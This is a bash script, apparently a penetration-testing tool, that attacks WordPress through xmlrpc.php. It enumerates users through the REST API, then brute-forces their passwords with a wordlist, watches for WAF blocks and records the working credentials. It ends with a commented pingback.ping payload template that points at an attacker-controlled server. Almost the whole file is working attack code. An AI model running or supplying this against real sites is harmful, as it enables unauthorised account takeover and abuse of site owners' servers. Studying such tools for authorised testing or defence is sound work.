#!/bin/bash
#
# https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32
# https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/
# https://codex.wordpress.org/XML-RPC_WordPress_API/Users
# https://www.homelab.it/index.php/2015/04/16/simple-wordpress-xml-rpc-brute-force-in-bash-with-curl/
#

url="$1"

curl_agent="\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\""
curl_options=(-A "${curl_agent}" -L -s -k)
password_brute_force=yes
password_wordlist="${HOME}/pentest/wordlists/rockyou.txt"
password_attack_file=/tmp/passwordAttack.txt
password_body_file=/tmp/passwordBody.txt
users_result_file=./wp-users.txt
xmlrpc_is_accessible=$(curl "${curl_options[@]}" -w "%{response_code}\n" "${url}/xmlrpc.php" -o /dev/null)
xmlrpc_listmethods_file=/tmp/listMethods.txt
xmlrpc_listusers_file=/tmp/listUsers.txt
wp_passwords_file=./wp-passwords.txt
timeout_waf_bypass=0

echo -n "Trying to access the xmlrpc.php... "

cat << EOF > ${xmlrpc_listmethods_file}
<?xml version="1.0" encoding="iso-8859-1"?>
    <methodCall>
        <methodName>system.listMethods</methodName>
        <params></params>
    </methodCall>
EOF

if [[ -n "${xmlrpc_is_accessible}" ]] && [[ "${xmlrpc_is_accessible}" -eq 405 ]]; then
    echo "Done!"
    echo -n "Trying to get malicious methods... "
    xmlrpc_methods=($(curl -X POST "${curl_options[@]}" -d "@/tmp/listMethods.txt" "${url}/xmlrpc.php" | \
        grep string | sed 's/<\/.*>// ; s/.*>//' | grep -v "parse error. not well formed" | \
        grep -E "pingback.ping|metaWeblog.getUsersBlogs|wp.getUsersBlogs|wp.getCategories"))
    if [ "${#xmlrpc_methods[@]}" -eq 0 ]; then
        echo "Fail!"
        echo "This WordPress was probably hardened!"
        exit 1
    else
        echo "Done!"
        [[ "${#xmlrpc_methods[@]}" -gt 0 ]] && printf "    %s\n" "${xmlrpc_methods[@]}"
        echo -n "Getting users... "
        if [ -s "${users_result_file}" ]; then
            echo "Done!"
            wp_users=($(sed -i 's/    //' "${users_result_file}" ; cat "${users_result_file}"))
            printf "    %s\n" ${wp_users[@]}
        elif [[ "${xmlrpc_methods[*]}" =~ "wp.getCategories" ]] || \
            [[ "${xmlrpc_methods[*]}" =~ "wp.getUsersBlogs" ]] || \
            [[ "${xmlrpc_methods[*]}" =~ "metaWeblog.getUsersBlogs" ]]; then
                wp_users=($(curl "${curl_options[@]}" "${url}/index.php/wp-json/wp/v2/users/?per_page=100&page=1" | \
                    jq '.[]' | grep slug | awk '{print $2}' | sed 's/"//g ; s/,//'))
                if [ ${#wp_users[@]} -gt 0 ]; then
                    echo "Done!"
                    printf "    %s\n" ${wp_users[@]} | tee -a "${users_result_file}"
                fi
        fi

        if [ "${password_brute_force}" == "yes" ]; then
            if [ -s "${password_wordlist}"  ] ; then
                for user in ${wp_users[@]}; do
                    echo -n "Looking for a valid password for the user ${user}... "
                    for password in $(cat "${password_wordlist}"); do

cat << EOF > ${password_attack_file}
<?xml version="1.0" encoding="iso-8859-1"?>
    <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value>${user}</value></param>
            <param><value>${password}</value></param>
        </params>
    </methodCall>
EOF
                        curl "${curl_options[@]}" --data @"${password_attack_file}" "${url}/xmlrpc.php" -o "${password_body_file}" 2> /dev/null 
                        sleep ${timeout_waf_bypass}

                        if [[ $(grep -E "Access.*IP.*address.*blocked.*security" "${password_body_file}") ]]; then
                            echo -e "Fail!\nWe were blocked by WAF, exiting!"
                            exit 1
                        fi
                        if [[ $(grep -E "O.*servi.*XML-RPC.*desativado.*site" "${password_body_file}") ]]; then
                            echo -e "Fail!\nThis WordPress was probably hardened!"
                            exit 1
                        fi

                        code=$(grep -A 1 "<name>faultCode</name>" "${password_body_file}" | \
                            grep -E "403|405|50." | sed 's/<\/.*>// ; s/<.*>// ; s/[[:blank:]]*//')

                        if [[ ${code} -ne 403 ]] && [[ ${code} -ne 405  ]] && [[ ${code} -ne 503 ]]; then
                            echo "Done!"
                            echo "Password: ${password}"
                            echo "${user}:${password}" >> "${wp_passwords_file}"
                            continue
                        fi
                    # password
                    done
                    if [ ! -s "${wp_passwords_file}" ] || [[ ! $(grep -E "^${user}") ]]; then
                        echo "Fail!"
                        echo "That word list didn't work!"
                    fi
                    unset user
               # user
               done
            # file password
            fi
            # brute force
        fi
    # users
    fi
else
    echo "Fail!"
    echo "We don't have access to xmlrpc."
    echo "This WordPress was probably hardened!"
fi

rm -f "${xmlrpc_listmethods_file}"
rm -f "${xmlrpc_listusers_file}"
rm -f "${password_attack_file}"
rm -f "${password_body_file}"

#<methodCall>
#<methodName>pingback.ping</methodName>
#<params><param>
#<value><string>http://<YOUR SERVER >:<port></string></value>
#</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
#</value></param></params>
#</methodCall>
